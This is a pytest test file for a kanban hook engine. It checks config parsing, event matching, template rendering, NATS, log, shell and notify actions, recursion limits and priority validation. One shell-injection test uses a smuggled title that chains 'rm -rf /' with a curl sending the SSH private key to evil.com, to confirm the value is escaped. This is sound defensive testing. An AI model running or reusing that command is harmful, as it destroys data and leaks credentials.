"""Tests for the kanban hook engine."""

import json
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from yurtle_kanban.hooks import (
    HookContext,
    HookEngine,
    HookEvent,
    _action_create_item,
    _action_log,
    _action_nats_publish,
    _action_notify,
    _action_shell,
    _execute_action,
    _extract_frontmatter,
)


# ─── Fixtures ──────────────────────────────────────────────────────────────


SAMPLE_YURTLE_HOOKS = """\
---
type: kanban-hooks
id: test-hooks
version: 1
hooks:
  on_create:
    - item_types: [idea]
      actions:
        - type: nats_publish
          subject: "ship.kanban.idea.created"
        - type: log
    - item_types: [expedition, chore]
      actions:
        - type: log
  on_status_change:
    - from: backlog
      to: in_progress
      item_types: [expedition]
      actions:
        - type: nats_publish
          subject: "ship.kanban.expedition.started"
        - type: log
    - to: done
      actions:
        - type: nats_publish
          subject: "ship.kanban.item.completed"
        - type: log
  on_blocked:
    - actions:
        - type: log
---

# Test Kanban Hooks

```yurtle
@prefix hook: <https://nusy.ai/kanban/hooks/> .

<hook/idea-created>
    a hook:Hook ;
    hook:event "on_create" ;
    hook:itemType "idea" .
```
"""


@pytest.fixture
def hooks_file(tmp_path):
    """Write sample hooks config to a Yurtle file."""
    hooks_dir = tmp_path / ".kanban" / "hooks"
    hooks_dir.mkdir(parents=True)
    hooks_path = hooks_dir / "kanban-hooks.yurtle.md"
    hooks_path.write_text(SAMPLE_YURTLE_HOOKS)
    return hooks_path


@pytest.fixture
def engine(hooks_file):
    """Create a HookEngine with sample config."""
    return HookEngine(hooks_file)


@pytest.fixture
def idea_context():
    """Context for a newly created IDEA."""
    return HookContext(
        event=HookEvent.ITEM_CREATED,
        item_id="IDEA-R-011",
        item_type="idea",
        title="Test Research Question",
        new_status="backlog",
    )


@pytest.fixture
def expedition_move_context():
    """Context for an expedition status change."""
    return HookContext(
        event=HookEvent.STATUS_CHANGE,
        item_id="EXP-999",
        item_type="expedition",
        title="Test Expedition",
        old_status="backlog",
        new_status="in_progress",
        assignee="M5",
    )


@pytest.fixture
def done_context():
    """Context for any item completing."""
    return HookContext(
        event=HookEvent.STATUS_CHANGE,
        item_id="CHORE-042",
        item_type="chore",
        title="Cleanup branches",
        old_status="in_progress",
        new_status="done",
    )


# ─── Config Loading ───────────────────────────────────────────────────────


class TestConfigLoading:
    def test_load_yurtle_frontmatter(self, hooks_file):
        engine = HookEngine(hooks_file)
        assert engine.is_configured
        assert "on_create" in engine._hooks_config
        assert "on_status_change" in engine._hooks_config
        assert "on_blocked" in engine._hooks_config

    def test_missing_file_is_noop(self):
        engine = HookEngine(Path("/nonexistent/hooks.yurtle.md"))
        assert not engine.is_configured

    def test_none_path_is_noop(self):
        engine = HookEngine(None)
        assert not engine.is_configured

    def test_empty_file(self, tmp_path):
        empty = tmp_path / "empty.yurtle.md"
        empty.write_text("")
        engine = HookEngine(empty)
        assert not engine.is_configured

    def test_no_hooks_key(self, tmp_path):
        f = tmp_path / "nohooks.yurtle.md"
        f.write_text("---\ntype: kanban-hooks\nversion: 1\n---\n# No hooks\n")
        engine = HookEngine(f)
        assert not engine.is_configured

    def test_frontmatter_extraction(self):
        content = "---\nfoo: bar\nbaz: 42\n---\n# Body\n"
        fm = _extract_frontmatter(content)
        assert fm["foo"] == "bar"
        assert fm["baz"] == 42

    def test_frontmatter_ignores_ttl_blocks(self, hooks_file):
        """TTL blocks in the body don't interfere with YAML parsing."""
        engine = HookEngine(hooks_file)
        assert engine.is_configured
        # Hooks came from YAML frontmatter, not TTL
        assert len(engine._hooks_config["on_create"]) == 2


# ─── Event Matching ───────────────────────────────────────────────────────


class TestEventMatching:
    def test_idea_create_matches(self, engine, idea_context):
        matched = engine._matching_hooks(HookEvent.ITEM_CREATED, idea_context)
        assert len(matched) == 1
        actions = matched[0]["actions"]
        assert actions[0]["type"] == "nats_publish"
        assert actions[1]["type"] == "log"

    def test_expedition_create_matches_second_hook(self, engine):
        ctx = HookContext(
            event=HookEvent.ITEM_CREATED,
            item_id="EXP-100",
            item_type="expedition",
            title="Test",
        )
        matched = engine._matching_hooks(HookEvent.ITEM_CREATED, ctx)
        assert len(matched) == 1
        assert matched[0]["actions"][0]["type"] == "log"

    def test_signal_create_no_match(self, engine):
        ctx = HookContext(
            event=HookEvent.ITEM_CREATED,
            item_id="SIG-001",
            item_type="signal",
            title="Test signal",
        )
        matched = engine._matching_hooks(HookEvent.ITEM_CREATED, ctx)
        assert len(matched) == 0

    def test_status_change_from_to_match(self, engine, expedition_move_context):
        matched = engine._matching_hooks(
            HookEvent.STATUS_CHANGE, expedition_move_context
        )
        # Matches: backlog→in_progress (expedition) + *→done (doesn't match)
        assert len(matched) == 1
        assert matched[0]["actions"][0]["subject"] == "ship.kanban.expedition.started"

    def test_status_change_to_done_matches_any_type(self, engine, done_context):
        matched = engine._matching_hooks(HookEvent.STATUS_CHANGE, done_context)
        assert len(matched) == 1
        assert matched[0]["actions"][0]["subject"] == "ship.kanban.item.completed"

    def test_status_change_wrong_from_no_match(self, engine):
        ctx = HookContext(
            event=HookEvent.STATUS_CHANGE,
            item_id="EXP-100",
            item_type="expedition",
            title="Test",
            old_status="review",
            new_status="in_progress",
        )
        matched = engine._matching_hooks(HookEvent.STATUS_CHANGE, ctx)
        assert len(matched) == 0

    def test_blocked_matches_all(self, engine):
        ctx = HookContext(
            event=HookEvent.BLOCKED,
            item_id="EXP-100",
            item_type="expedition",
            title="Test",
        )
        matched = engine._matching_hooks(HookEvent.BLOCKED, ctx)
        assert len(matched) == 1

    def test_unregistered_event_no_match(self, engine):
        ctx = HookContext(
            event=HookEvent.STALE_DETECTED,
            item_id="EXP-100",
            item_type="expedition",
            title="Test",
        )
        matched = engine._matching_hooks(HookEvent.STALE_DETECTED, ctx)
        assert len(matched) == 0


# ─── HookContext ──────────────────────────────────────────────────────────


class TestHookContext:
    def test_to_dict(self, idea_context):
        d = idea_context.to_dict()
        assert d["event"] == "on_create"
        assert d["item_id"] == "IDEA-R-011"
        assert d["item_type"] == "idea"
        assert "timestamp" in d

    def test_render_template(self, idea_context):
        result = idea_context.render_template("Item {item_id} of type {item_type}")
        assert result == "Item IDEA-R-011 of type idea"

    def test_render_template_event(self, expedition_move_context):
        result = expedition_move_context.render_template(
            "ship.kanban.{event}.{item_type}"
        )
        assert result == "ship.kanban.on_status_change.expedition"

    def test_render_template_status(self, expedition_move_context):
        result = expedition_move_context.render_template(
            "{old_status} -> {new_status}"
        )
        assert result == "backlog -> in_progress"

    def test_render_template_missing_optional(self, idea_context):
        result = idea_context.render_template("assigned to: {assignee}")
        assert result == "assigned to: "

    def test_timestamp_consistent(self, idea_context):
        """to_dict() and render_template() use the same timestamp."""
        d = idea_context.to_dict()
        rendered = idea_context.render_template("{timestamp}")
        assert d["timestamp"] == rendered

    def test_metadata_cannot_shadow_standard_keys(self):
        """Explicit fields always win over metadata with same keys."""
        ctx = HookContext(
            event=HookEvent.ITEM_CREATED,
            item_id="EXP-001",
            item_type="expedition",
            title="Real Title",
            metadata={"item_id": "FAKE-999", "title": "Evil Override"},
        )
        d = ctx.to_dict()
        assert d["item_id"] == "EXP-001"
        assert d["title"] == "Real Title"


# ─── Actions ──────────────────────────────────────────────────────────────


class TestNatsPublishAction:
    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_publishes_to_subject(self, mock_run, idea_context):
        action = {"type": "nats_publish", "subject": "ship.kanban.idea.created"}
        _action_nats_publish(action, idea_context)

        mock_run.assert_called_once()
        args = mock_run.call_args[0][0]
        assert args[0] == "nats"
        assert args[1] == "pub"
        assert args[2] == "ship.kanban.idea.created"
        # Payload is JSON
        payload = json.loads(args[3])
        assert payload["item_id"] == "IDEA-R-011"
        assert payload["event"] == "on_create"

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_template_subject(self, mock_run, expedition_move_context):
        action = {"type": "nats_publish", "subject": "ship.kanban.{item_type}.started"}
        _action_nats_publish(action, expedition_move_context)

        args = mock_run.call_args[0][0]
        assert args[2] == "ship.kanban.expedition.started"

    @patch(
        "yurtle_kanban.hooks.subprocess.run",
        side_effect=FileNotFoundError("nats not found"),
    )
    def test_missing_nats_cli_no_crash(self, mock_run, idea_context):
        action = {"type": "nats_publish", "subject": "test"}
        # Should not raise
        _action_nats_publish(action, idea_context)

    @patch(
        "yurtle_kanban.hooks.subprocess.run",
        side_effect=subprocess.TimeoutExpired("nats", 10),
    )
    def test_timeout_no_crash(self, mock_run, idea_context):
        action = {"type": "nats_publish", "subject": "test"}
        _action_nats_publish(action, idea_context)


class TestLogAction:
    def test_writes_jsonl(self, tmp_path, idea_context):
        log_path = tmp_path / "hooks.log"
        action = {"type": "log", "path": str(log_path)}
        _action_log(action, idea_context)

        lines = log_path.read_text().strip().split("\n")
        assert len(lines) == 1
        entry = json.loads(lines[0])
        assert entry["item_id"] == "IDEA-R-011"
        assert entry["event"] == "on_create"

    def test_appends_multiple(self, tmp_path, idea_context, done_context):
        log_path = tmp_path / "hooks.log"
        action = {"type": "log", "path": str(log_path)}
        _action_log(action, idea_context)
        _action_log(action, done_context)

        lines = log_path.read_text().strip().split("\n")
        assert len(lines) == 2

    def test_creates_parent_dirs(self, tmp_path, idea_context):
        log_path = tmp_path / "deep" / "nested" / "hooks.log"
        action = {"type": "log", "path": str(log_path)}
        _action_log(action, idea_context)
        assert log_path.exists()


class TestShellAction:
    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_runs_command(self, mock_run, idea_context):
        mock_run.return_value = MagicMock(returncode=0)
        action = {"type": "shell", "command": "echo {item_id}"}
        _action_shell(action, idea_context)

        mock_run.assert_called_once()
        # Values are shlex.quote()-wrapped for injection safety
        assert mock_run.call_args[0][0] == "echo IDEA-R-011"

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_shell_injection_prevented(self, mock_run, idea_context):
        """Item titles with shell metacharacters are safely escaped."""
        mock_run.return_value = MagicMock(returncode=0)
        ctx = HookContext(
            event=HookEvent.ITEM_CREATED,
            item_id="EXP-666",
            item_type="expedition",
            title='Test; rm -rf / && curl evil.com/$(cat ~/.ssh/id_rsa)',
        )
        action = {"type": "shell", "command": "echo {title}"}
        _action_shell(action, ctx)

        mock_run.assert_called_once()
        cmd = mock_run.call_args[0][0]
        # shlex.quote() wraps dangerous values in single quotes
        import shlex
        expected = f"echo {shlex.quote(ctx.title)}"
        assert cmd == expected

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_custom_timeout(self, mock_run, idea_context):
        mock_run.return_value = MagicMock(returncode=0)
        action = {"type": "shell", "command": "sleep 1", "timeout": 5}
        _action_shell(action, idea_context)

        assert mock_run.call_args[1]["timeout"] == 5

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_nonzero_exit_no_crash(self, mock_run, idea_context):
        mock_run.return_value = MagicMock(returncode=1, stderr="error")
        action = {"type": "shell", "command": "false"}
        _action_shell(action, idea_context)

    def test_empty_command_noop(self, idea_context):
        action = {"type": "shell", "command": ""}
        _action_shell(action, idea_context)  # Should not raise

    @patch(
        "yurtle_kanban.hooks.subprocess.run",
        side_effect=subprocess.TimeoutExpired("cmd", 30),
    )
    def test_timeout_no_crash(self, mock_run, idea_context):
        action = {"type": "shell", "command": "sleep 999", "timeout": 1}
        _action_shell(action, idea_context)


class TestExecuteAction:
    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_dispatches_nats(self, mock_run, idea_context):
        _execute_action(
            {"type": "nats_publish", "subject": "test"}, idea_context
        )
        mock_run.assert_called_once()

    def test_dispatches_log(self, tmp_path, idea_context):
        log_path = tmp_path / "test.log"
        _execute_action({"type": "log", "path": str(log_path)}, idea_context)
        assert log_path.exists()

    def test_unknown_type_no_crash(self, idea_context):
        _execute_action({"type": "unknown_action"}, idea_context)


# ─── Engine Integration ───────────────────────────────────────────────────


class TestHookEngineTrigger:
    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_idea_create_fires_nats_and_log(
        self, mock_run, engine, idea_context, tmp_path
    ):
        # Patch the log path in the config to use tmp_path
        for hook in engine._hooks_config.get("on_create", []):
            for action in hook.get("actions", []):
                if action["type"] == "log":
                    action["path"] = str(tmp_path / "hooks.log")

        engine.trigger(HookEvent.ITEM_CREATED, idea_context)

        # nats_publish was called
        mock_run.assert_called_once()
        args = mock_run.call_args[0][0]
        assert args[2] == "ship.kanban.idea.created"

        # log was written
        log_path = tmp_path / "hooks.log"
        assert log_path.exists()

    def test_no_config_trigger_is_noop(self, idea_context):
        engine = HookEngine(None)
        engine.trigger(HookEvent.ITEM_CREATED, idea_context)  # No crash

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_expedition_move_fires_correct_hooks(
        self, mock_run, engine, expedition_move_context, tmp_path
    ):
        for hook in engine._hooks_config.get("on_status_change", []):
            for action in hook.get("actions", []):
                if action["type"] == "log":
                    action["path"] = str(tmp_path / "hooks.log")

        engine.trigger(HookEvent.STATUS_CHANGE, expedition_move_context)

        # nats was called with expedition.started subject
        args = mock_run.call_args[0][0]
        assert args[2] == "ship.kanban.expedition.started"

    @patch(
        "yurtle_kanban.hooks._execute_action",
        side_effect=RuntimeError("boom"),
    )
    def test_action_failure_does_not_propagate(self, mock_exec, engine, idea_context):
        """Hook action failures are swallowed — kanban op must succeed."""
        engine.trigger(HookEvent.ITEM_CREATED, idea_context)
        # No exception raised


# ─── Create Item Action ──────────────────────────────────────────────────


class TestCreateItemAction:
    def test_calls_callback(self, idea_context):
        mock_cb = MagicMock(return_value={"item_id": "CHORE-099", "file_path": "/tmp/c.md"})
        action = {
            "type": "create_item",
            "item_type": "chore",
            "title": "Auto: {item_id}",
            "priority": "high",
            "tags": ["auto-created"],
        }
        _action_create_item(action, idea_context, {"create_item": mock_cb})

        mock_cb.assert_called_once_with(
            item_type="chore",
            title="Auto: IDEA-R-011",
            priority="high",
            tags=["auto-created"],
        )

    def test_renders_templates(self, idea_context):
        mock_cb = MagicMock(return_value={"item_id": "CHORE-100"})
        action = {
            "type": "create_item",
            "item_type": "chore",
            "title": "Remediate stale: {item_id} - {title}",
        }
        _action_create_item(action, idea_context, {"create_item": mock_cb})

        call_kwargs = mock_cb.call_args[1]
        assert call_kwargs["title"] == "Remediate stale: IDEA-R-011 - Test Research Question"

    def test_missing_callback_no_crash(self, idea_context):
        action = {"type": "create_item", "item_type": "chore", "title": "Test"}
        _action_create_item(action, idea_context, {})  # No crash

    def test_callback_failure_no_crash(self, idea_context):
        mock_cb = MagicMock(side_effect=RuntimeError("DB error"))
        action = {"type": "create_item", "item_type": "chore", "title": "Test"}
        _action_create_item(action, idea_context, {"create_item": mock_cb})  # No crash

    def test_default_priority(self, idea_context):
        mock_cb = MagicMock(return_value={"item_id": "CHORE-101"})
        action = {"type": "create_item", "item_type": "chore", "title": "Test"}
        _action_create_item(action, idea_context, {"create_item": mock_cb})

        call_kwargs = mock_cb.call_args[1]
        assert call_kwargs["priority"] == "medium"

    def test_with_tags(self, idea_context):
        mock_cb = MagicMock(return_value={"item_id": "CHORE-102"})
        action = {
            "type": "create_item",
            "item_type": "chore",
            "title": "Test",
            "tags": ["stale", "auto"],
        }
        _action_create_item(action, idea_context, {"create_item": mock_cb})

        call_kwargs = mock_cb.call_args[1]
        assert call_kwargs["tags"] == ["stale", "auto"]

    def test_callback_returns_none(self, idea_context):
        mock_cb = MagicMock(return_value=None)
        action = {"type": "create_item", "item_type": "chore", "title": "Test"}
        _action_create_item(action, idea_context, {"create_item": mock_cb})  # No crash

    def test_execute_action_dispatches_create_item(self, idea_context):
        mock_cb = MagicMock(return_value={"item_id": "CHORE-103"})
        action = {"type": "create_item", "item_type": "chore", "title": "Test"}
        _execute_action(action, idea_context, {"create_item": mock_cb})
        mock_cb.assert_called_once()


# ─── Notify Action ───────────────────────────────────────────────────────


class TestNotifyAction:
    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_publishes_to_channel_subject(self, mock_run, idea_context):
        action = {
            "type": "notify",
            "channel": "bosun",
            "message": "{item_id} created",
        }
        _action_notify(action, idea_context)

        mock_run.assert_called_once()
        args = mock_run.call_args[0][0]
        assert args[0] == "nats"
        assert args[1] == "pub"
        assert args[2] == "ship.channel.bosun"

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_renders_template_message(self, mock_run, idea_context):
        action = {
            "type": "notify",
            "channel": "bosun",
            "message": "{item_id} blocked: {title}",
        }
        _action_notify(action, idea_context)

        payload = json.loads(mock_run.call_args[0][0][3])
        assert payload["message"] == "IDEA-R-011 blocked: Test Research Question"

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_wire_protocol_format(self, mock_run, idea_context):
        action = {"type": "notify", "channel": "bosun", "message": "test"}
        _action_notify(action, idea_context)

        payload = json.loads(mock_run.call_args[0][0][3])
        assert payload["type"] == "channel_message"
        assert payload["group"] == "bosun"
        assert payload["from"] == "kanban-hooks"
        assert payload["fromId"] == "yurtle-kanban"
        assert "timestamp" in payload
        assert "message" in payload

    @patch(
        "yurtle_kanban.hooks.subprocess.run",
        side_effect=FileNotFoundError("nats not found"),
    )
    def test_missing_nats_cli_no_crash(self, mock_run, idea_context):
        action = {"type": "notify", "channel": "bosun", "message": "test"}
        _action_notify(action, idea_context)  # No crash

    @patch(
        "yurtle_kanban.hooks.subprocess.run",
        side_effect=subprocess.TimeoutExpired("nats", 10),
    )
    def test_timeout_no_crash(self, mock_run, idea_context):
        action = {"type": "notify", "channel": "bosun", "message": "test"}
        _action_notify(action, idea_context)  # No crash

    @patch("yurtle_kanban.hooks.subprocess.run")
    def test_template_channel(self, mock_run, expedition_move_context):
        action = {
            "type": "notify",
            "channel": "{assignee}",
            "message": "You got {item_id}",
        }
        _action_notify(action, expedition_move_context)

        args = mock_run.call_args[0][0]
        assert args[2] == "ship.channel.M5"

    def test_execute_action_dispatches_notify(self, idea_context):
        with patch("yurtle_kanban.hooks.subprocess.run") as mock_run:
            action = {"type": "notify", "channel": "bosun", "message": "test"}
            _execute_action(action, idea_context)
            mock_run.assert_called_once()


# ─── Recursion Guard ─────────────────────────────────────────────────────


class TestRecursionGuard:
    def test_depth_starts_at_zero(self):
        engine = HookEngine(None)
        assert engine._depth == 0

    def test_depth_resets_after_trigger(self, engine, idea_context):
        engine.trigger(HookEvent.ITEM_CREATED, idea_context)
        assert engine._depth == 0

    def test_depth_resets_after_exception(self, engine, idea_context):
        """Depth resets even when an action raises."""
        with patch(
            "yurtle_kanban.hooks._execute_action",
            side_effect=RuntimeError("boom"),
        ):
            engine.trigger(HookEvent.ITEM_CREATED, idea_context)
        assert engine._depth == 0

    def test_stops_at_max_depth(self):
        """Trigger at max depth is a no-op."""
        engine = HookEngine(None)
        engine._hooks_config = {
            "on_create": [{"actions": [{"type": "log"}]}],
        }
        engine._depth = HookEngine._MAX_HOOK_DEPTH

        ctx = HookContext(
            event=HookEvent.ITEM_CREATED,
            item_id="EXP-001",
            item_type="expedition",
            title="Test",
        )
        # Should not execute (at depth limit)
        with patch("yurtle_kanban.hooks._execute_action") as mock_exec:
            engine.trigger(HookEvent.ITEM_CREATED, ctx)
            mock_exec.assert_not_called()

        # Depth unchanged (wasn't incremented since we hit the guard)
        assert engine._depth == HookEngine._MAX_HOOK_DEPTH

    def test_nested_trigger_increments_depth(self):
        """Simulates create_item action that triggers on_create inside trigger."""
        engine = HookEngine(None)
        engine._hooks_config = {
            "on_create": [{"actions": [{"type": "log"}]}],
        }
        depths_seen = []

        original_exec = _execute_action

        def tracking_exec(action, context, callbacks=None):
            depths_seen.append(engine._depth)
            # Simulate a nested trigger (like create_item would do)
            if engine._depth == 1:
                inner_ctx = HookContext(
                    event=HookEvent.ITEM_CREATED,
                    item_id="AUTO-001",
                    item_type="chore",
                    title="Nested",
                )
                engine.trigger(HookEvent.ITEM_CREATED, inner_ctx)

        with patch("yurtle_kanban.hooks._execute_action", side_effect=tracking_exec):
            ctx = HookContext(
                event=HookEvent.ITEM_CREATED,
                item_id="EXP-001",
                item_type="expedition",
                title="Test",
            )
            engine.trigger(HookEvent.ITEM_CREATED, ctx)

        # First call at depth 1, nested at depth 2
        assert depths_seen == [1, 2]
        assert engine._depth == 0


# ─── Callback Registration ───────────────────────────────────────────────


class TestCallbackRegistration:
    def test_set_callback(self):
        engine = HookEngine(None)
        fn = MagicMock()
        engine.set_callback("create_item", fn)
        assert engine._callbacks["create_item"] is fn

    def test_callback_passed_to_execute_action(self, hooks_file, idea_context):
        engine = HookEngine(hooks_file)
        mock_cb = MagicMock(return_value={"item_id": "CHORE-050"})
        engine.set_callback("create_item", mock_cb)

        # Add a create_item action to on_create
        engine._hooks_config["on_create"].append({
            "item_types": ["idea"],
            "actions": [
                {
                    "type": "create_item",
                    "item_type": "chore",
                    "title": "Auto from {item_id}",
                }
            ],
        })

        with patch("yurtle_kanban.hooks.subprocess.run"):
            engine.trigger(HookEvent.ITEM_CREATED, idea_context)

        mock_cb.assert_called_once()
        assert mock_cb.call_args[1]["title"] == "Auto from IDEA-R-011"


# ─── #125: hook create_item goes through the service's priority rule ─────


_HOOK_PRIORITY_YAML = """\
---
type: kanban-hooks
id: priority-hooks
version: 1
hooks:
  on_create:
    - item_types: [feature]
      actions:
        - type: create_item
          item_type: bug
          title: "Follow-up for {item_id}"
          priority: {priority}
---
"""


class TestHookCreateItemPriorityValidated:
    """A hooks-config ``create_item`` action goes through the same priority
    validation as every other write path: an unknown priority is refused (and
    logged), a mixed-case one is lowercased (#125)."""

    @pytest.fixture
    def repo(self, tmp_path):
        from yurtle_kanban.config import KanbanConfig, PathConfig

        subprocess.run(
            ["git", "init", "-b", "main"], cwd=tmp_path, capture_output=True, check=True,
        )
        subprocess.run(
            ["git", "config", "user.email", "t@t.com"],
            cwd=tmp_path, capture_output=True, check=True,
        )
        subprocess.run(
            ["git", "config", "user.name", "T"], cwd=tmp_path, capture_output=True, check=True,
        )
        (tmp_path / ".kanban" / "hooks").mkdir(parents=True)
        (tmp_path / "kanban-work" / "features").mkdir(parents=True)
        (tmp_path / "kanban-work" / "bugs").mkdir(parents=True)
        config = KanbanConfig(
            theme="software",
            paths=PathConfig(
                root="kanban-work/",
                scan_paths=["kanban-work/features/", "kanban-work/bugs/"],
            ),
        )
        config.save(tmp_path / ".kanban" / "config.yaml")
        return tmp_path, config

    def _service(self, repo, priority: str):
        from yurtle_kanban.service import KanbanService

        root, config = repo
        hooks_path = root / ".kanban" / "hooks" / "kanban-hooks.yurtle.md"
        hooks_path.write_text(_HOOK_PRIORITY_YAML.replace("{priority}", priority))
        return KanbanService(config, root, hooks_config=hooks_path)

    @staticmethod
    def _bug_files(root: Path) -> list[Path]:
        return sorted((root / "kanban-work" / "bugs").glob("*.md"))

    def _trigger(self, svc):
        from yurtle_kanban.models import WorkItemType

        with patch("yurtle_kanban.hooks.subprocess.run"):
            return svc.create_item(WorkItemType.FEATURE, "Trigger")

    def test_hook_create_item_does_not_write_unknown_priority(self, repo, caplog):
        root, _ = repo
        svc = self._service(repo, "urgent")

        with caplog.at_level("DEBUG"):
            trigger = self._trigger(svc)

        assert trigger.file_path.exists()  # the triggering create itself succeeds
        for f in self._bug_files(root):
            assert "priority: urgent" not in f.read_text(), f.read_text()
        assert self._bug_files(root) == []
        assert "urgent" in caplog.text

    def test_hook_create_item_uppercase_priority_is_lowercased(self, repo):
        root, _ = repo
        svc = self._service(repo, "HIGH")

        self._trigger(svc)

        bugs = self._bug_files(root)
        assert len(bugs) == 1
        assert "\npriority: high\n" in bugs[0].read_text()

    # --- negative control ---------------------------------------------------

    def test_hook_create_item_valid_priority_is_written(self, repo):
        root, _ = repo
        svc = self._service(repo, "low")

        self._trigger(svc)

        bugs = self._bug_files(root)
        assert len(bugs) == 1
        assert "\npriority: low\n" in bugs[0].read_text()
